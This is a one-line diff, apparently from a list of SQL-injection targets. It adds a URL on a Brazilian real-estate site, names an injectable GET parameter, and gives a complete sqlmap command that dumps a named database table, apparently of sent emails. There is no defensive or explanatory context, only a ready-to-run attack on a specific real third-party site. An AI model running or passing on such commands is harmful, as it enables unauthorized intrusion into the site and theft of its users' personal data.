@@ -1,0 +1,1 @@
+http://www.ilumineimoveis.com.br/detalhes_loc.php?Imovel=31 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.ilumineimoveis.com.br/detalhes_loc.php?Imovel=31 -D ilumineimoveis -T ide_emailenviados --dump
